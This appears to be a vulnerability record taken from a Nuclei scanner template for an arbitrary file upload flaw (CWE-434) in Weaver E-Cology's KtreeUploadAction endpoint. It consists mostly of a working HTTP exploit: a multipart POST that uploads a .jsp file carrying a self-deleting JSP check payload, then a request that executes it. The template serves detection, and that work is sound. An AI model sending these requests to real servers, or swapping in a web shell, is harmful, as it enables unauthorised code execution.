# Vulnerability: Weaver E-Cology KtreeUploadAction - Arbitrary File Upload
**Classification:** CWE-434
**Source:** Nuclei Template (`weaver-ktreeuploadaction-file-upload.yaml`)

## Description
There is a file upload vulnerability in Weaver E-Cology. An attacker can upload any file through KtreeUploadAction.jsp and further exploit it.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywgljfvib

------WebKitFormBoundarywgljfvib
Content-Disposition: form-data; name="test"; filename="{{randstr}}.jsp"
Content-Type: image/jpeg

<%out.print({{num1}} * {{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarywgljfvib--

@timeout: 20s
GET {{filename}} HTTP/1.1
Host: {{Hostname}}
```

